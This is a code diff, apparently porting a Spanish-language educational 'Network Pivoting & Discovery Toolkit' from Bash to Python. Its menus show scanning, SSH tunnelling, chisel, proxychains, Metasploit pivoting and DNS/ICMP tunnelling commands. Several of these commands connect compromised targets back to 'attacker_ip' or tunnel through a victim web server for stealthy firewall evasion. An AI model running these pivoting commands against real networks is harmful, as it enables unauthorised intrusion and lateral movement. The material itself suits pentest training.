-show_command "ssh -O exit -S /tmp/ssh_mux user@$JUMP_HOST" "Close master connection"
-echo -e "${MAGENTA}Objetivo:${NC} Reutilizar conexiones SSH para mayor velocidad."
-echo -e "${MAGENTA}Notas:${NC} Reduce overhead de múltiples conexiones SSH. Muy útil para scripting."
-press_enter
-}
+  Host interno
+      HostName internal_host
+      User {cfg.ssh_user}
+      ProxyJump jump
+      LocalForward {cfg.local_port} localhost:{cfg.remote_port}
+"""
+    print(cyan(config_example))
+    print(dim("  Con esta config solo necesitás: ssh interno"))
+    pause()
 
-ssh_config_info() {
-show_banner
-echo -e "${GREEN}SSH Config Avanzado:${NC}"
-echo
-show_command "echo 'Host jump_host\n  HostName 192.168.1.100\n  User user\n  IdentityFile ~/.ssh/id_rsa\n  LocalForward 1080 localhost:1080' >> ~/.ssh/config" "SSH config file"
-show_command "ssh -W internal_host:3389 jump_host" "ProxyJump equivalent"
-show_command "ssh -J user1@jump1,user2@jump2 internal_host" "Multiple jumps"
-echo -e "${MAGENTA}Objetivo:${NC} Configuración avanzada de SSH para pivoting complejo."
-echo -e "${MAGENTA}Notas:${NC} El archivo ~/.ssh/config simplifica conexiones complejas."
-press_enter
-}
 
-# ==============================================
-# FUNCIONES DE INFORMACIÓN - METASPLOIT
-# ==============================================
+# ── DISCOVERY ────────────────────────────────
+def module_nmap():
+    banner()
+    section("Nmap · Escaneo y Enumeración")
+    print(f"""
+  {bold('Concepto:')}
+    Nmap es el estándar para descubrimiento de hosts,
+    servicios, versiones y detección de vulnerabilidades.
 
-metasploit_pf_info() {
-show_banner
-echo -e "${GREEN}Metasploit Port Forwarding:${NC}"
-echo
-show_command "portfwd add -l 3389 -p 3389 -r internal_host" "Forward RDP"
-show_command "portfwd add -l 445 -p 445 -r internal_host" "Forward SMB"
-show_command "portfwd list" "List active forwards"
-show_command "portfwd delete -l 3389 -p 3389 -r internal_host" "Delete forward"
-echo -e "${MAGENTA}Objetivo:${NC} Port forwarding through Meterpreter session."
-echo -e "${MAGENTA}Notas:${NC} Works even through multiple hops. Uses existing Meterpreter session."
-press_enter
-}
+  {bold('Fases típicas en un engagement:')}
+    1. Host discovery  →  ¿Quién está vivo?
+    2. Port scan       →  ¿Qué puertos abiertos?
+    3. Service scan    →  ¿Qué servicios/versiones?
+    4. Script scan     →  ¿Vulnerabilidades conocidas?
+""")
+    cmds = [
+        (f"nmap -sn {cfg.target_network}",
+         "Phase 1 · Host discovery (sin port scan)"),
+        (f"nmap -p- --min-rate 5000 --open -T4 {cfg.target_network}",
+         "Phase 2 · Todos los puertos, rápido"),
+        (f"nmap -sV -sC -p 22,80,443,445,3389 {cfg.target_network}",
+         "Phase 3 · Versiones y scripts por defecto"),
+        (f"nmap --script vuln -p 80,443,445 {cfg.target_network}",
+         "Phase 4 · Detección de vulnerabilidades"),
+        (f"nmap -sU -p 53,67,123,161 --open {cfg.target_network}",
+         "Bonus · Escaneo UDP (servicios importantes)"),
+    ]
+    for cmd, desc in cmds:
+        run_command(cmd, desc)
+    pause()
 
-metasploit_socks_info() {
-show_banner
-echo -e "${GREEN}Metasploit SOCKS Proxy:${NC}"
-echo
-show_command "use auxiliary/server/socks_proxy" "Start SOCKS server"
-show_command "set VERSION 4a" "Set SOCKS version"
-show_command "set SRVPORT 1080" "Set port"
-show_command "run" "Start proxy"
-show_command "use post/multi/manage/autoroute" "Auto add routes"
-echo -e "${MAGENTA}Objetivo:${NC} Create SOCKS proxy through Metasploit sessions."
-echo -e "${MAGENTA}Notas:${NC} Combine with autoroute for automatic routing through sessions."
-press_enter
-}
+def module_masscan():
+    banner()
+    section("Masscan · Escaneo Ultrarrápido")
+    print(f"""
+  {bold('Concepto:')}
+    Masscan puede escanear miles de hosts por segundo.
+    Ideal para reconocimiento inicial en redes grandes.
 
-metasploit_full_pivot_info() {
-show_banner
-echo -e "${GREEN}Metasploit Pivoting Completo:${NC}"
-echo
-show_command "use post/multi/manage/autoroute" "Auto add routes"
-show_command "set SESSION 1" "Set session"
-show_command "set SUBNET 192.168.10.0/24" "Set target subnet"
-show_command "run" "Add route"
-show_command "use auxiliary/server/socks_proxy" "Start SOCKS"
-echo -e "${MAGENTA}Objetivo:${NC} Pivoting completo con rutas automáticas y SOCKS."
-echo -e "${MAGENTA}Notas:${NC} Combina autoroute y SOCKS proxy para acceso completo a la red interna."
-press_enter
-}
+  {bold('Trade-off:')}
+    Velocidad  ▲  ←→  Precisión ▼
+    Para confirmación, siempre validá con nmap después.
+""")
+    cmds = [
+        (f"masscan -p80,443,22,3389,445 {cfg.target_network} --rate 5000",
+         "Puertos comunes, velocidad moderada"),
+        (f"masscan -p1-65535 {cfg.target_network} --rate 10000 -oX masscan_out.xml",
+         "Todos los puertos, exportar a XML"),
+        (f"masscan --ping {cfg.target_network} --rate 1000",
+         "Solo ping sweep (host discovery)"),
+        (f"nmap -sV -p- -iL masscan_ips.txt",
+         "Validar resultados de masscan con nmap"),
+    ]
+    for cmd, desc in cmds:
+        run_command(cmd, desc)
+    pause()
 
-metasploit_reverse_info() {
-show_banner
-echo -e "${GREEN}Metasploit Reverse Pivoting:${NC}"
-echo
-show_command "portfwd add -R -l 8080 -p 80 -L 192.168.1.100" "Reverse forward"
-show_command "use exploit/windows/local/portfwder" "Port forwarder payload"
-echo -e "${MAGENTA}Objetivo:${NC} Reverse pivoting from internal network to attacker."
-echo -e "${MAGENTA}Notas:${NC} Useful when internal host can't connect out. Creates reverse tunnels."
-press_enter
-}
+def module_netdiscover():
+    banner()
+    section("Netdiscover · ARP Discovery")
+    print(f"""
+  {bold('Concepto:')}
+    Usa paquetes ARP para descubrir hosts en la LAN.
+    Más confiable que ICMP en redes internas (el firewall
+    no puede bloquear ARP en la misma subred).
 
-# ==============================================
-# FUNCIONES DE INFORMACIÓN - HERRAMIENTAS AVANZADAS
-# ==============================================
+  {bold('Modos:')}
+    Activo  → Envía ARP requests (más rápido, detectable)
+    Pasivo  → Solo escucha tráfico ARP (más sigiloso)
+""")
+    cmds = [
+        (f"netdiscover -i eth0 -r {cfg.target_network}",
+         "Descubrimiento ARP activo"),
+        (f"netdiscover -p -i eth0",
+         "Modo pasivo (solo escucha, sigiloso)"),
+        (f"netdiscover -f -i eth0 -r {cfg.target_network}",
+         "Modo rápido (menos verificación)"),
+    ]
+    for cmd, desc in cmds:
+        run_command(cmd, desc)
+    pause()
 
-chisel_info() {
-show_banner
-echo -e "${GREEN}Chisel - TCP/UDP Tunneling:${NC}"
-echo
-show_command "chisel server -p 8080 --reverse" "Servidor Chisel"
-show_command "chisel client server_ip:8080 R:1080:socks" "Cliente SOCKS"
-show_command "chisel client server_ip:8080 R:3389:target:3389" "Reverse port forward"
-show_command "chisel client server_ip:8080 0.0.0.0:445:target:445" "Local port forward"
-echo -e "${MAGENTA}Objetivo:${NC} Tunneling TCP/UDP a través de firewalls."
-echo -e "${MAGENTA}Notas:${NC} Herramienta poderosa escrita en Go. Soporta reconexión automática y cifrado."
-press_enter
-}
 
-rpivot_info() {
-show_banner
-echo -e "${GREEN}Rpivot - SOCKS Proxy:${NC}"
-echo
-show_command "python server.py --proxy-port 1080 --server-port 9443" "Servidor Rpivot"
-show_command "python client.py --server-ip attacker_ip --server-port 9443" "Cliente Rpivot"
-show_command "python client.py --server-ip attacker_ip --server-port 9443 --ntlm-proxy-ip proxy_ip --ntlm-proxy-port 8080 --domain CORP --username user" "Through corporate proxy"
-echo -e "${MAGENTA}Objetivo:${NC} Crear proxies SOCKS a través de hosts comprometidos."
-echo -e "${MAGENTA}Notas:${NC} Soporta autenticación NTLM a través de proxies corporativos. Muy sigiloso."
-press_enter
-}
+# ── HERRAMIENTAS AVANZADAS ────────────────────
+def module_chisel():
+    banner()
+    section("Chisel · TCP/UDP Tunneling (sin SSH)")
+    print(f"""
+  {bold('Concepto:')}
+    Chisel crea túneles TCP/UDP sobre HTTP/WebSockets.
+    Escrito en Go → un solo binario, fácil de transferir.
 
-regeorg_info() {
-show_banner
-echo -e "${GREEN}reGeorg - Web Tunneling:${NC}"
-echo
-show_command "python reGeorgSocksProxy.py -p 1080 -u http://victim/tunnel.php" "Proxy SOCKS through web"
-show_command "proxychains nmap -sT -p 3389 internal_ip" "Scan through reGeorg"
-echo -e "${MAGENTA}Objetivo:${NC} Crear tunnels SOCKS a través de servidores web comprometidos."
-echo -e "${MAGENTA}Notas:${NC} Ideal cuando solo el puerto 80/443 está abierto. Sube tunnel.aspx al servidor web."
-press_enter
-}
+  {bold('Cuándo usarlo:')}
+    - El target no tiene SSH pero sí tiene salida HTTP/HTTPS.
+    - Necesitás traversal de firewalls restrictivos.
 
-sshuttle_info() {
-show_banner
-echo -e "${GREEN}sshuttle - VPN-like Proxy:${NC}"
-echo
-show_command "sshuttle -r user@jump_host 192.168.0.0/24" "VPN completa para red"
-show_command "sshuttle -r user@jump_host -x 192.168.1.100 192.168.0.0/24" "Excluir IP específica"
-show_command "sshuttle -r user@jump_host --dns 192.168.0.0/24" "Incluir tunneling DNS"
-echo -e "${MAGENTA}Objetivo:${NC} Crear VPN-like transparente sobre SSH."
-echo -e "${MAGENTA}Notas:${NC} No requiere root en el lado del cliente. Soporta DNS tunneling."
-press_enter
-}
+  {bold('Flujo:')}
+    [Tu PC: servidor chisel] ◄──HTTP──── [Target: cliente chisel]
+    Luego usás proxychains o port forward localmente.
+""")
+    cmds = [
+        ("chisel server -p 8080 --reverse",
+         "Servidor Chisel (en tu máquina)"),
+        ("chisel client server_ip:8080 R:1080:socks",
+         "Cliente → SOCKS inverso (en el target)"),
+        ("chisel client server_ip:8080 R:3389:internal_host:3389",
+         "Cliente → Reverse port forward RDP"),
+        ("chisel client server_ip:8080 0.0.0.0:445:target:445",
+         "Cliente → Local port forward SMB"),
+    ]
+    for cmd, desc in cmds:
+        run_command(cmd, desc)
+    pause()
 
-plink_info() {
-show_banner
-echo -e "${GREEN}Plink (Windows SSH):${NC}"
-echo
-show_command "plink.exe -ssh -P 22 -pw password user@jump_host -L 3389:internal_host:3389" "Local port forward"
-show_command "plink.exe -ssh -P 22 -pw password user@jump_host -R 8080:localhost:80" "Remote port forward"
-show_command "plink.exe -ssh -P 22 -pw password user@jump_host -D 1080" "Dynamic SOCKS"
-echo -e "${MAGENTA}Objetivo:${NC} SSH tunneling en Windows sin cliente SSH nativo."
-echo -e "${MAGENTA}Notas:${NC} Parte de PuTTY. Útil en entornos Windows restrictivos."
-press_enter
-}
+def module_sshuttle():
+    banner()
+    section("sshuttle · VPN Transparente sobre SSH")
+    print(f"""
+  {bold('Concepto:')}
+    sshuttle crea una VPN-like transparente sobre SSH.
+    No requiere root en el cliente, sí en el servidor.
+    Todo el tráfico hacia la red target pasa por el jump host.
 
-proxychains_config_info() {
-show_banner
-echo -e "${GREEN}Proxychains Configuration:${NC}"
-echo
-show_command "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf" "Add SOCKS proxy"
-show_command "proxychains nmap -sT -p 80,443,3389 internal_ip" "Nmap through proxy"
-show_command "proxychains xfreerdp /v:internal_ip /u:user" "RDP through proxy"
-show_command "proxychains evil-winrm -i internal_ip -u user" "WinRM through proxy"
-echo -e "${MAGENTA}Objetivo:${NC} Configurar y usar proxychains para redirigir tráfico."
-echo -e "${MAGENTA}Notas:${NC} Editar /etc/proxychains.conf para múltiples proxies en cadena. Use -f para config file personalizado."
-press_enter
-}
+  {bold('Ventaja sobre SOCKS:')}
+    No necesitás proxychains. Funciona de forma transparente
+    para cualquier aplicación, incluyendo resolución DNS.
+""")
+    cmds = [
+        (f"sshuttle -r {cfg.ssh_user}@{cfg.jump_host} {cfg.target_network}",
+         "VPN para toda la red target"),
+        (f"sshuttle -r {cfg.ssh_user}@{cfg.jump_host} --dns {cfg.target_network}",
+         "Incluir DNS tunneling"),
+        (f"sshuttle -r {cfg.ssh_user}@{cfg.jump_host} -x {cfg.jump_host}/32 {cfg.target_network}",
+         "Excluir el jump host del tunnel"),
+        (f"sshuttle -r {cfg.ssh_user}@{cfg.jump_host} 0.0.0.0/0",
+         "Rutar TODO el tráfico (full VPN)"),
+    ]
+    for cmd, desc in cmds:
+        run_command(cmd, desc)
+    pause()
 
-# ==============================================
-# INICIO DE LA APLICACIÓN
-# ==============================================
+def module_proxychains():
+    banner()
+    section("Proxychains · Encadenado de Proxies")
+    print(f"""
+  {bold('Concepto:')}
+    proxychains fuerza cualquier conexión TCP de una
+    aplicación a través de una cadena de proxies SOCKS/HTTP.
 
-echo -e "${GREEN}Iniciando Network Pivoting & Discovery Toolkit...${NC}"
-sleep 2
-main_menu
+  {bold('Flujo típico:')}
+    1. Levantar proxy SOCKS (ssh -D o chisel)
+    2. Configurar /etc/proxychains.conf
+    3. Prefixar cualquier comando con 'proxychains'
+""")
+    config_example = f"""
+  # /etc/proxychains.conf
+  strict_chain          # falla si un proxy no responde
+  # dynamic_chain       # saltar proxies caídos
+  proxy_dns             # resolver DNS a través del proxy
+  [ProxyList]
+  socks5  127.0.0.1  {cfg.socks_port}
+"""
+    print(cyan(config_example))
+
+    cmds = [
+        (f"echo 'socks5 127.0.0.1 {cfg.socks_port}' >> /etc/proxychains.conf",
+         "Agregar proxy SOCKS5"),
+        (f"proxychains nmap -sT -p 22,80,445,3389 192.168.2.1",
+         "Nmap a través del proxy (solo -sT funciona)"),
+        (f"proxychains xfreerdp /v:192.168.2.10 /u:administrator",
+         "RDP a través del proxy"),
+        (f"proxychains curl http://internal.corp/",
+         "HTTP a través del proxy"),
+    ]
+    for cmd, desc in cmds:
+        run_command(cmd, desc)
+    pause()
+
+def module_metasploit():
+    banner()
+    section("Metasploit · Pivoting con Meterpreter")
+    print(f"""
+  {bold('Concepto:')}
+    Con una sesión Meterpreter activa podés agregar rutas
+    para que el framework haga pivoting automáticamente.
+
+  {bold('Flujo:')}
+    1. Obtener sesión Meterpreter en host comprometido
+    2. Agregar ruta hacia la red interna (autoroute)
+    3. Levantar SOCKS proxy del framework
+    4. Usar proxychains para cualquier herramienta externa
+""")
+    msf_script = """
+  # Dentro de msfconsole, con sesión activa:
+
+  meterpreter > run post/multi/manage/autoroute SUBNET=192.168.2.0/24 SESSION=1
+  meterpreter > background
+
+  msf6 > use auxiliary/server/socks_proxy
+  msf6 auxiliary(socks_proxy) > set VERSION 5
+  msf6 auxiliary(socks_proxy) > set SRVPORT 1080
+  msf6 auxiliary(socks_proxy) > run -j
+
+  # Port forward directo desde meterpreter:
+  meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.2.10
+  meterpreter > portfwd list
+  meterpreter > portfwd delete -l 3389 -p 3389 -r 192.168.2.10
+"""
+    print(cyan(msf_script))
+    print(yellow("  Nota: estos comandos se ejecutan DENTRO de msfconsole, no en bash."))
+    pause()
+
+def module_dns_icmp():
+    banner()
+    section("DNS / ICMP Tunneling · Evasión de Firewalls")
+    print(f"""
+  {bold('Cuándo usarlo:')}
+    Redes muy restrictivas donde SOLO el puerto 53 (DNS)
+    o el protocolo ICMP (ping) están permitidos.
+
+  {bold('DNS Tunneling (dnscat2 / iodine):')}
+    Los datos se encapsulan en queries/respuestas DNS.
+    Requiere dominio propio con NS apuntando a tu servidor.
+
+  {bold('ICMP Tunneling (ptunnel):')}
+    Los datos se encapsulan en el payload de paquetes ICMP.
+    Bajo ancho de banda pero muy sigiloso.
+""")
+    cmds_dns = [
+        ("dnscat2-server --dns host=attacker_ip,port=53 --secret=mysecret",
+         "dnscat2 · Servidor (en tu máquina)"),
+        ("dnscat2 victim.com --secret=mysecret",
+         "dnscat2 · Cliente (en el target)"),
+        ("iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com",
+         "iodine · Servidor DNS tunnel"),
+        ("iodine -f -P password tunnel.yourdomain.com",
+         "iodine · Cliente DNS tunnel"),
+    ]
+    cmds_icmp = [
+        ("ptunnel -x password",
+         "ptunnel · Servidor ICMP (en tu máquina)"),
+        ("ptunnel -p attacker_ip -lp 1080 -da target_ip -dp 3389 -x password",
+         "ptunnel · Cliente ICMP"),
+    ]
+    print(f"\n  {bold('── DNS ──')}")
+    for cmd, desc in cmds_dns:
+        run_command(cmd, desc)
+    print(f"\n  {bold('── ICMP ──')}")
+    for cmd, desc in cmds_icmp:
+        run_command(cmd, desc)
+    pause()
+
+
+# ─────────────────────────────────────────────
+#  MENÚS
+# ─────────────────────────────────────────────
+def menu_ssh():
+    options = {
+        "1": ("SSH Local Port Forwarding",          module_ssh_local),
+        "2": ("SSH Remote Port Forwarding",         module_ssh_remote),
+        "3": ("SSH Dynamic (SOCKS Proxy)",          module_ssh_dynamic),
+        "4": ("SSH ProxyJump (múltiples saltos)",   module_ssh_jump),
+    }
+    submenu("SSH Tunneling", options)
+
+def menu_discovery():
+    options = {
+        "1": ("Nmap · Escaneo avanzado",            module_nmap),
+        "2": ("Masscan · Escaneo rápido",           module_masscan),
+        "3": ("Netdiscover · ARP Discovery",        module_netdiscover),
+    }
+    submenu("Herramientas de Discovery", options)
+
+def menu_advanced():
+    options = {
+        "1": ("Chisel · TCP/UDP Tunneling",         module_chisel),
+        "2": ("sshuttle · VPN sobre SSH",           module_sshuttle),
+        "3": ("Proxychains · Config y uso",         module_proxychains),
+        "4": ("Metasploit · Meterpreter Pivoting",  module_metasploit),
+        "5": ("DNS / ICMP Tunneling",               module_dns_icmp),
+    }
+    submenu("Herramientas Avanzadas", options)
+
+def submenu(title: str, options: dict):
+    while True:
+        banner()
+        print(f"  {bold(title)}\n")
+        for key, (label, _) in options.items():
+            print(f"  {cyan(key)}.  {label}")
+        print(f"  {cyan('0')}.  {dim('Volver')}")
+        print()
+        choice = input(f"  {yellow('▸')} Seleccioná una opción: ").strip()
+        if choice == "0":
+            break
+        elif choice in options:
+            options[choice][1]()
+        else:
+            print(red("  Opción no válida."))
+            time.sleep(1)
+
+def menu_config():
+    while True:
+        banner()
+        print(f"  {bold('Configuración de Entorno')}\n")
+        print(f"  {cyan('1')}.  Jump Host       → {cfg.jump_host}")
+        print(f"  {cyan('2')}.  Target Network  → {cfg.target_network}")
+        print(f"  {cyan('3')}.  SSH User        → {cfg.ssh_user}")
+        print(f"  {cyan('4')}.  SOCKS Port      → {cfg.socks_port}")
+        print(f"  {cyan('5')}.  Local Port      → {cfg.local_port}")
+        print(f"  {cyan('6')}.  Remote Port     → {cfg.remote_port}")
+        print(f"  {cyan('7')}.  Logging         → {'ON' if cfg.log_enabled else 'OFF'}")
+        print(f"  {cyan('0')}.  {dim('Volver')}")
+        print()
+        choice = input(f"  {yellow('▸')} Seleccioná una opción: ").strip()
+
+        if choice == "0":
+            break
+        elif choice == "1":
+            val = input(f"  Nuevo Jump Host [{cfg.jump_host}]: ").strip()
+            if val: cfg.jump_host = val
+        elif choice == "2":
+            val = input(f"  Nueva Target Network [{cfg.target_network}]: ").strip()
+            if val:
+                try:
+                    ipaddress.ip_network(val, strict=False)
+                    cfg.target_network = val
+                except ValueError:
+                    print(red("  Red inválida (formato: 192.168.1.0/24)"))
+                    time.sleep(2)
+        elif choice == "3":
+            val = input(f"  SSH User [{cfg.ssh_user}]: ").strip()
+            if val: cfg.ssh_user = val
+        elif choice == "4":
+            val = input(f"  SOCKS Port [{cfg.socks_port}]: ").strip()
+            if val.isdigit(): cfg.socks_port = int(val)
+        elif choice == "5":
+            val = input(f"  Local Port [{cfg.local_port}]: ").strip()
+            if val.isdigit(): cfg.local_port = int(val)
+        elif choice == "6":
+            val = input(f"  Remote Port [{cfg.remote_port}]: ").strip()
+            if val.isdigit(): cfg.remote_port = int(val)
+        elif choice == "7":
+            cfg.log_enabled = not cfg.log_enabled
+            status = green("ACTIVADO") if cfg.log_enabled else red("DESACTIVADO")
+            print(f"  Logging {status} → {cfg.log_file}")
+            time.sleep(2)
+
+
+def main_menu():
+    options = {
+        "1": ("SSH Tunneling",                  menu_ssh),
+        "2": ("Herramientas de Discovery",      menu_discovery),
+        "3": ("Herramientas Avanzadas",         menu_advanced),
+        "4": ("Auto-detección de Red",          detect_network),
+        "5": ("Estado de Herramientas",         show_tool_status),
+        "6": ("Configuración",                  menu_config),
+    }
+    while True:
+        banner()
+        print(f"  {bold('Menú Principal')}\n")
+        for key, (label, _) in options.items():
+            print(f"  {cyan(key)}.  {label}")
+        print(f"  {cyan('0')}.  Salir")
+        print()
+        choice = input(f"  {yellow('▸')} Seleccioná una opción: ").strip()
+
+        if choice == "0":
+            print(green("\n  Hasta luego.\n"))
+            sys.exit(0)
+        elif choice in options:
+            options[choice][1]()
+        else:
+            print(red("  Opción no válida."))
+            time.sleep(1)
+
+
+# ─────────────────────────────────────────────
+#  PUNTO DE ENTRADA
+# ─────────────────────────────────────────────
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(
+        description="Network Pivoting & Discovery Toolkit - Versión Educativa"
+    )
+    parser.add_argument("--jump",    default=None, help="Jump host IP/hostname")
+    parser.add_argument("--network", default=None, help="Target network CIDR (ej: 192.168.2.0/24)")
+    parser.add_argument("--user",    default=None, help="Usuario SSH")
+    parser.add_argument("--log",     action="store_true", help="Activar logging a archivo")
+    parser.add_argument("--check",   action="store_true", help="Solo verificar herramientas y salir")
+    args = parser.parse_args()
+
+    if args.jump:    cfg.jump_host = args.jump
+    if args.network: cfg.target_network = args.network
+    if args.user:    cfg.ssh_user = args.user
+    if args.log:     cfg.log_enabled = True
+
+    if args.check:
+        show_tool_status()
+        sys.exit(0)
+
+    try:
+        main_menu()
+    except KeyboardInterrupt:
+        print(yellow("\n\n  Saliendo...\n"))
+        sys.exit(0)
